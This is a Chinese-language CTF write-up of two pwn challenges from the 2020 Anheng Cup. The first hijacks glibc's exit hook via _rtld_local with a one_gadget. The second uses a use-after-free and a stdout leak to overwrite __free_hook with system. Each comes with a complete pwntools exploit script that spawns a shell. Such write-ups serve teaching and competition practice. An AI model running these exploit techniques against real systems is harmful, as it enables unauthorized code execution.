# 安恒杯--WP


 几时归去，作个闲人。对一张琴，一壶酒，一溪云。					——《行香子·述怀》苏轼

<!--more-->

# 安恒杯-WP

这次参加的安恒杯，做了两道pwn题，一个拿了一血，一个拿了二血，两道题的漏洞和利用都不叫简单，逆向代码也不复杂，和朋友也成功的闯入了线下赛，期待和各位师傅们的面基，线下赛加油！[2020anxun题目下载](https://github.com/nopnoping/nopnoping.github.io/tree/master/resource/2020anxun)

## Einstein

题目的逻辑是输入一个json数据，解析json后check它的字段，最后拥有三次任意地址写一个字节的机会。看到这个任意地址写，我想出题人应该借鉴了2020虎符marks man颇多。

仔细分析函数逻辑后发现，check函数不管你输入对，还是输入错都会返回1，并且两个printf函数打印的是同一个堆块，如果第一个堆块被释放后，第二次打印就会泄漏libc。

![image-20201202161509441](C:\Users\10457\AppData\Roaming\Typora\typora-user-images\image-20201202161509441.png)

![image-20201126141212063](https://i.loli.net/2020/11/26/K1CqQ4afgSiLk3v.png)

libc泄露后，接下来的问题就是如何利用任意地址写3个字节来获得Shell。利用思路和虎符marks man题目一样，打exit函数。这里我把这个利用方法详细的探讨一下，知其然要知其所以然。

查看libc源码，可以发现exit函数实际调用的是一个\_\_run\_exit\_handlers函数，\_\_run_exit_handlers函数执行中会跳转到dl_fini函数，dl_fini函数中有一段关键代码。

````c
#ifdef SHARED
  int do_audit = 0;
 again:
#endif
  for (Lmid_t ns = GL(dl_nns) - 1; ns >= 0; --ns)
    {
      /* Protect against concurrent loads and unloads.  */
      __rtld_lock_lock_recursive (GL(dl_load_lock));

      unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;
      /* No need to do anything for empty namespaces or those used for
	 auditing DSOs.  */
      if (nloaded == 0
#ifdef SHARED
	  || GL(dl_ns)[ns]._ns_loaded->l_auditing != do_audit
#endif
	  )
	__rtld_lock_unlock_recursive (GL(dl_load_lock));
````

其中最关键的是：

````c
__rtld_lock_lock_recursive (GL(dl_load_lock));
__rtld_lock_unlock_recursive (GL(dl_load_lock));
````

这里我们以__rtld_lock_lock_recursive为例。

查看__rtld_lock_lock_recursive 的定义如下：

````c
#define __rtld_lock_lock_recursive(NAME) \
	GL(dl_rtld_unlock_recursive) (&(NAME).mutex)
````

查看GL的定义

````c
#  define GL(name) _rtld_local._##name
# else
#  define GL(name) _rtld_global._##name
````

这里出现了一个新的结构体\_rtld_local。综上所述调用\_rtld_lock\_lock\_recursive (GL(dl\_load\_lock))，实际就是调用**\_rtld\_local.dl_rtld_unlock_recursive (&(GL(dl\_load\_lock)).mutex)**。

我们在gdb中查看一下\_rtld\_local这个结构究竟是什么东西。（gdb中输入p \_rtld\_local）

![a](https://gitee.com/nopnoping/img/raw/master/img/1.jpg)

![image-20201128195347223](https://i.loli.net/2020/11/28/FHtOQwxuLv4Sd9e.png)

我们可以看到\_rtld\_local这个结构体的dl_rtld_unlock_recursive成员其实就是一个函数指针，其指向了rtld_lock_default_unlock_recursive这个函数，并且由于该函数是libc里面的函数，我们只需要修改其3个字节就可以篡改为我们的onegadget。

Ok，总结一下exit的调用过程：**exit==>dl_fini==>_rtld\_local.dl_rtld_unlock_recursive**

````python
#Author: Nopnoping
from pwn import *

s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()

if args['REMOTE']:
	sh=remote("axb.d0g3.cn",20103)
else:
	sh=process("./sfs")

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'

def debug(command=''):
	#context.terminal = ['tmux', 'splitw', '-h']
	gdb.attach(sh,command)


def exp():
	#debug("b*0x7ffff77f4364\nc")
	libc=ELF("./libc-2.23.so")
	json="{\"name\": \"aaaa\",\"passwd\": \"aaa\"}"
	sl(json)
	ru("error!\nlogger:")
	libc_base=u64(ru(" ").replace(" ","\x00").ljust(8,"\x00"))-0x3c4b78
	info_addr("libc_base",libc_base)
	one_gadget=0xf0364+libc_base
	exit_hook=libc_base+0x8f9f48
	info_addr("one_gadget",one_gadget)
	for i in range(3):
		s(p64(exit_hook+i))
		s(chr(one_gadget&0xff))
		one_gadget=one_gadget>>8
	#debug()
	itr()

exp()
````

## IO_FILE

UAF漏洞，程序没有开启PIE和REALO，并且libc是2.27的版本，漏洞很好利用，唯一的一个难点是unsorted bin堆块中记录的libc地址和IO_stdout结构体之间相差太多，暴力解比较困难，这里需要转换一下思路。

由于题目没有开启PIE，因此我们知道got表的地址，而got表中有stdout指针，其记录了IO_stdout结构体的地址，因此我们可以利用UAF，修改堆块fd为stdout got表地址，这样就可以间接获得IO_stdou结构的地址，而无需爆破。

````python
#Author: Nopnoping
from pwn import *

s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()

if args['REMOTE']:
	sh=remote("axb.d0g3.cn",20102)
else:
	sh=process("./IO_FILE")

if args['I386']:
	context.arch='i386'
else:
	context.arch='amd64'

if args['DEBUG']:
	context.log_level='debug'

def debug(command=''):
	#context.terminal = ['tmux', 'splitw', '-h']
	gdb.attach(sh,command)

def choice(elect):
	ru('>')
	sl(str(elect).encode())

def add(size,content):
	choice(1)
	ru(':')
	sl(str(size).encode())
	ru(":")
	s(content)

def delete(index):
	choice(2)
	ru(':')
	sl(str(index).encode())

def exp():
	libc=ELF("./libc.so.6")
	add(0x90,"0")
	add(0x80,"1")
	for i in range(4):
		delete(0)
	add(0x90,p64(0x602080))
	add(0x90,"a")
	add(0x90,"\x60")
	add(0x90,p64(0xfbad1800)+p64(0)*3+"\x00")
	ru("\xe3")
	libc_base=u64(("\xe3"+r(5)).ljust(8,"\x00"))-131-libc.symbols["_IO_2_1_stdout_"]
	system=libc_base+libc.symbols["system"]
	free_hook=libc_base+libc.symbols["__free_hook"]
	info_addr("libc_base",libc_base)
	info_addr("system",system)
	info_addr("free_hook",free_hook)
	for i in range(3):
		delete(1)
	add(0x80,p64(free_hook))
	add(0x80,"a")
	add(0x80,p64(system))
	add(0x10,"/bin/sh\x00")
	delete(9)
	itr()

exp()
````

## 参考

[exit_hook劫持](https://blog.csdn.net/qq_43116977/article/details/105485947)
